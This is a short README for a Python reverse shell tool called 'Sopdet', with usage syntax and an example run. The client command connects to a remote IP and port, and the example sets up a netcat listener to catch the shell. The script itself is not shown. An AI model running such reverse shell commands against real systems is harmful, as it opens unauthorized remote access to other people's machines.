# Sopdet
A simple cross-platform reverse shell written in Python

Sopdet is a client-side Python script that when run on a Linux/Unix or Windows system will open up a shell on a remote server running Netcat as a listener on the specified port.

## Usage:
`python sopdet.py <IP address> <port>`

## Example:

### Client-side

`python sopdet.py 192.168.0.2 4444 linux`

`[*] Sobdet client connected to 192.168.0.2`

### Server-side

`nc -lv 4444`

`Connection from 192.168.0.3 65095 received!`
